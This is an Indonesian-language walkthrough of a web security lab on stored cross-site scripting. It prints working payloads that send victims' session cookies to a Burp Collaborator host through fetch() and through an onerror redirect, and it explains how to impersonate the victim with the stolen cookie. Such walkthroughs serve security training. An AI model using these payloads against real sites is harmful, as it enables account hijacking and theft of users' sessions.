
# Exploiting cross-site scripting to steal cookies

# Mengeksploitasi Cross-Site Scripting untuk Mencuri Cookie

cara 1:
# Mengeksploitasi Cross-Site Scripting untuk Mencuri Cookie Menggunakan Burp Collaborator

Lab ini mengandung kerentanan **Stored XSS** pada fungsi komentar blog. Pengguna yang menjadi korban akan melihat semua komentar setelah diposting. Untuk menyelesaikan lab ini, eksploitasi kerentanan ini untuk mencuri cookie sesi korban menggunakan Burp Collaborator, kemudian gunakan cookie tersebut untuk menyamar sebagai korban.

**Catatan:** Untuk mencegah platform Academy digunakan untuk menyerang pihak ketiga, firewall kami memblokir interaksi antara lab dan sistem eksternal yang sewenang-wenang. Untuk menyelesaikan lab ini, Anda harus menggunakan server publik default Burp Collaborator.

Beberapa pengguna mungkin menyadari bahwa ada solusi alternatif untuk lab ini yang tidak memerlukan Burp Collaborator. Namun, metode ini jauh kurang halus dibandingkan dengan mencuri cookie.

---------------------------------------------

## Referensi:

- [PortSwigger: Exploiting Cross-Site Scripting](https://portswigger.net/web-security/cross-site-scripting/exploiting)

---------------------------------------------

## Langkah-Langkah Eksploitasi

### 1. Menguji Kerentanan XSS pada Salah Satu Postingan Blog

Pertama, kita menguji apakah terdapat kerentanan XSS pada salah satu postingan blog. Payload berikut berhasil:

```html
</p><img src=x onerror=alert(1) /><p>
```

![Langkah 1](images/Exploiting%20cross-site%20scripting%20to%20steal%20cookies/1.png)

### 2. Menyiapkan Burp Collaborator untuk Mencuri Cookie Sesi

Gunakan **Burp Suite Professional** dan ikuti langkah-langkah berikut untuk memanfaatkan Burp Collaborator dalam mencuri cookie sesi korban:

1. **Buka Tab Collaborator di Burp Suite:**
   
   ![Burp Collaborator Tab](images/Exploiting%20cross-site%20scripting%20to%20steal%20cookies/collaborator_tab.png)

2. **Salin Payload Unik Burp Collaborator:**
   
   Klik tombol "Copy to clipboard" untuk menyalin payload Collaborator yang unik.

3. **Susun Payload XSS dengan Burp Collaborator:**
   
   Masukkan payload berikut ke dalam komentar blog, menggantikan `BURP-COLLABORATOR-SUBDOMAIN` dengan subdomain yang telah Anda salin dari Collaborator:

   ```html
   <script>
   fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
       method: 'POST',
       mode: 'no-cors',
       body: document.cookie
   });
   </script>
   ```

   Contoh payload setelah mengganti subdomain:

   ```html
   <script>
   fetch('https://abcd1234.oastify.com', {
       method: 'POST',
       mode: 'no-cors',
       body: document.cookie
   });
   </script>
   ```

4. **Posting Komentar dengan Payload XSS:**
   
   Masukkan payload tersebut ke dalam formulir komentar dan kirimkan. Payload ini akan membuat siapa saja yang melihat komentar tersebut mengirimkan permintaan POST yang berisi cookie sesi mereka ke subdomain Burp Collaborator Anda.

### 3. Memantau Interaksi di Burp Collaborator

1. **Kembali ke Tab Collaborator:**
   
   Setelah mengirimkan payload, kembali ke tab Collaborator di Burp Suite.

2. **Klik "Poll now":**
   
   Klik tombol "Poll now" untuk memeriksa interaksi yang masuk.

   ![Poll Collaborator](images/Exploiting%20cross-site%20scripting%20to%20steal%20cookies/poll_now.png)

3. **Periksa Interaksi HTTP:**
   
   Anda akan melihat interaksi HTTP yang masuk. Jika tidak ada interaksi yang terdaftar, tunggu beberapa detik dan coba lagi.

   ![Interaksi Burp Collaborator](images/Exploiting%20cross-site%20scripting%20to%20steal%20cookies/interaksi_collaborator.png)

4. **Catat Nilai Cookie Sesi Korban:**
   
   Ambil nilai cookie sesi korban yang terdapat dalam tubuh POST.

### 4. Menyamarkan Diri sebagai Korban dengan Cookie yang Dicuri

1. **Reload Halaman Blog Utama:**
   
   Gunakan **Burp Proxy** atau **Burp Repeater** untuk mengganti cookie sesi Anda dengan cookie yang telah Anda tangkap dari Burp Collaborator.

2. **Tambahkan Cookie yang Dicuri:**
   
   Tambahkan cookie tersebut ke permintaan HTTP Anda.

   ![Menambahkan Cookie](images/Exploiting%20cross-site%20scripting%20to%20steal%20cookies/add_cookie.png)

3. **Kirim Permintaan untuk Menyamar:**
   
   Kirimkan permintaan tersebut untuk menyelesaikan lab. Untuk membuktikan bahwa Anda telah berhasil meng-hijack sesi pengguna admin, Anda dapat menggunakan cookie yang sama dalam permintaan ke `/my-account` untuk memuat halaman akun pengguna admin.

   ![Mengakses Akun Admin](images/Exploiting%20cross-site%20scripting%20to%20steal%20cookies/access_admin.png)

## Penjelasan

**Cross-Site Scripting (XSS)** adalah kerentanan keamanan yang memungkinkan penyerang untuk menyuntikkan skrip berbahaya ke dalam situs web yang dipercaya oleh pengguna. Dalam kasus ini, kerentanan **Stored XSS** memungkinkan skrip berbahaya disimpan di server (misalnya, dalam komentar blog) dan dijalankan setiap kali pengguna melihat konten tersebut.

### Payload Menggunakan Burp Collaborator

Payload yang digunakan dalam metode ini memanfaatkan **Burp Collaborator** untuk mencuri cookie sesi pengguna tanpa memunculkan dialog alert yang mencurigakan. Berikut adalah detail payload:

```html
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
    method: 'POST',
    mode: 'no-cors',
    body: document.cookie
});
</script>
```

- **`fetch` API:** Mengirimkan permintaan HTTP POST ke subdomain Burp Collaborator Anda.
- **`method: 'POST'`:** Menentukan metode HTTP yang digunakan adalah POST.
- **`mode: 'no-cors'`:** Menghindari pembatasan CORS sehingga permintaan dapat dikirimkan tanpa diblokir.
- **`body: document.cookie`:** Mengirimkan seluruh cookie sesi pengguna sebagai isi tubuh permintaan.

### Proses Pencurian dan Penyamarannya

1. **Pencurian Cookie:**
   
   Ketika korban melihat komentar yang berisi payload ini, browser mereka akan menjalankan skrip tersebut. Skrip akan mengirimkan cookie sesi mereka ke server Burp Collaborator Anda.

2. **Pengambilan Cookie:**
   
   Anda kemudian memantau interaksi di Burp Collaborator dan mengambil cookie sesi yang dikirimkan oleh korban.

3. **Penyamaran:**
   
   Dengan mengganti cookie sesi Anda dengan cookie yang dicuri, Anda dapat menyamar sebagai korban dan mengakses akun mereka tanpa perlu mengetahui kredensial asli.

## Kesimpulan

Eksploitasi **Stored XSS** memungkinkan penyerang untuk mencuri cookie sesi pengguna dan menyamar sebagai mereka, memberikan akses tidak sah ke akun pengguna. Dengan menggunakan **Burp Collaborator**, metode ini menjadi lebih tersembunyi dan efektif dibandingkan dengan metode sederhana seperti penggunaan `alert()`. Penting untuk selalu memvalidasi dan menyaring input pengguna untuk mencegah kerentanan XSS.

# Referensi Tambahan

- [OWASP Cross-Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)

# Disclaimer

Tutorial ini disediakan hanya untuk tujuan pendidikan dan penelitian keamanan. Jangan gunakan teknik ini untuk aktivitas ilegal atau tanpa izin.

# Gambar Pendukung

![Langkah 1](images/Exploiting%20cross-site%20scripting%20to%20steal%20cookies/1.png)

![Poll Collaborator](images/Exploiting%20cross-site%20scripting%20to%20steal%20cookies/poll_now.png)

![Interaksi Burp Collaborator](images/Exploiting%20cross-site%20scripting%20to%20steal%20cookies/interaksi_collaborator.png)

![Menambahkan Cookie](images/Exploiting%20cross-site%20scripting%20to%20steal%20cookies/add_cookie.png)

![Mengakses Akun Admin](images/Exploiting%20cross-site%20scripting%20to%20steal%20cookies/access_admin.png)


cara 2:

Lab ini mengandung kerentanan **Stored XSS** pada fungsi komentar blog. Pengguna yang menjadi korban akan melihat semua komentar setelah diposting. Untuk menyelesaikan lab ini, eksploitasi kerentanan ini untuk mencuri cookie sesi korban, kemudian gunakan cookie tersebut untuk menyamar sebagai korban.

**Catatan:** Untuk mencegah platform Academy digunakan untuk menyerang pihak ketiga, firewall kami memblokir interaksi antara lab dan sistem eksternal yang sewenang-wenang. Untuk menyelesaikan lab ini, Anda harus menggunakan server publik default Burp Collaborator.

Beberapa pengguna mungkin menyadari bahwa ada solusi alternatif untuk lab ini yang tidak memerlukan Burp Collaborator. Namun, metode ini jauh kurang halus dibandingkan dengan mencuri cookie.

---------------------------------------------

## Referensi:

- [PortSwigger: Exploiting Cross-Site Scripting](https://portswigger.net/web-security/cross-site-scripting/exploiting)

---------------------------------------------

## Langkah-Langkah Eksploitasi

### 1. Menguji Kerentanan XSS pada Salah Satu Postingan Blog

Pertama, kita menguji apakah terdapat kerentanan XSS pada salah satu postingan blog. Payload berikut berhasil:

```html
</p><img src=x onerror=alert(1) /><p>
```

![Langkah 1](images/Exploiting%20cross-site%20scripting%20to%20steal%20cookies/1.png)

### 2. Mencoba Payload untuk Mencuri Cookie Sesi

Selanjutnya, kita mencoba payload yang akan mengirimkan cookie sesi korban ke server Burp Collaborator:

```javascript
'document.location="http://s2v2in38mu6tj6w733goro9f066xunic.oastify.com/?cookies="+document.cookie'
```

Payload lengkap yang dimasukkan ke dalam komentar blog:

```html
</p><img src=x onerror='document.location="http://s2v2in38mu6tj6w733goro9f066xunic.oastify.com/?cookies="+document.cookie' /><p>
```

Setelah payload dijalankan, kita menerima cookie di Burp Collaborator:

![Langkah 2](images/Exploiting%20cross-site%20scripting%20to%20steal%20cookies/2.png)

### 3. Menggunakan Cookie untuk Menyamarkan Diri sebagai Korban

Kemudian, kita intercept permintaan ke halaman Home dan menambahkan cookie yang telah dicuri:

![Langkah 3](images/Exploiting%20cross-site%20scripting%20to%20steal%20cookies/3.png)

Dengan menambahkan cookie tersebut, kita dapat menyamar sebagai korban dan mengakses akun mereka.

## Penjelasan

**Cross-Site Scripting (XSS)** adalah kerentanan keamanan yang memungkinkan penyerang untuk menyuntikkan skrip berbahaya ke dalam situs web yang dipercaya oleh pengguna. Dalam kasus ini, kerentanan **Stored XSS** memungkinkan skrip berbahaya disimpan di server (misalnya, dalam komentar blog) dan dijalankan setiap kali pengguna melihat konten tersebut.

### Payload Pertama

Payload pertama:

```html
</p><img src=x onerror=alert(1) /><p>
```

Payload ini menutup tag `<p>`, menyisipkan elemen gambar dengan sumber yang tidak valid (`src=x`), dan menetapkan event handler `onerror` yang akan memicu `alert(1)` ketika gambar gagal dimuat. Ini adalah cara sederhana untuk menguji apakah input kita dieksekusi sebagai HTML/JavaScript.

### Payload Kedua

Payload kedua:

```html
</p><img src=x onerror='document.location="http://s2v2in38mu6tj6w733goro9f066xunic.oastify.com/?cookies="+document.cookie' /><p>
```

Payload ini lebih kompleks dan bertujuan untuk mencuri cookie sesi pengguna. Ketika gambar gagal dimuat, event handler `onerror` akan mengalihkan lokasi dokumen ke URL Burp Collaborator dengan menambahkan cookie sesi (`document.cookie`) sebagai parameter query. Server Burp Collaborator kemudian menerima cookie tersebut, yang dapat digunakan untuk menyamar sebagai pengguna yang sah.

### Menyamarkan Diri dengan Cookie

Setelah mendapatkan cookie sesi korban, kita dapat menggunakannya untuk mengakses aplikasi web sebagai korban. Dengan menambahkan cookie ini ke permintaan HTTP kita (misalnya, melalui proxy seperti Burp Suite), server akan menganggap kita sebagai pengguna yang sah dan memberikan akses sesuai dengan hak istimewa pengguna tersebut.

## Kesimpulan

Eksploitasi **Stored XSS** memungkinkan penyerang untuk mencuri cookie sesi pengguna dan menyamar sebagai mereka, memberikan akses tidak sah ke akun pengguna. Penting untuk selalu memvalidasi dan menyaring input pengguna untuk mencegah kerentanan XSS.

# Referensi Tambahan

- [OWASP Cross-Site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)

# Disclaimer

Tutorial ini disediakan hanya untuk tujuan pendidikan dan penelitian keamanan. Jangan gunakan teknik ini untuk aktivitas ilegal atau tanpa izin.

# Gambar Pendukung

![Langkah 1](images/Exploiting%20cross-site%20scripting%20to%20steal%20cookies/1.png)

![Langkah 2](images/Exploiting%20cross-site%20scripting%20to%20steal%20cookies/2.png)

![Langkah 3](images/Exploiting%20cross-site%20scripting%20to%20steal%20cookies/3.png)

# Terima Kasih

Semoga panduan ini bermanfaat dalam memahami dan mengatasi kerentanan Cross-Site Scripting!

# Tags

#XSS #KeamananWeb #CyberSecurity #PenetrationTesting #StoredXSS #Cookies #BurpCollaborator

Then intercept the request to the Home page and add these cookies:



![img](images/Exploiting%20cross-site%20scripting%20to%20steal%20cookies/3.png)
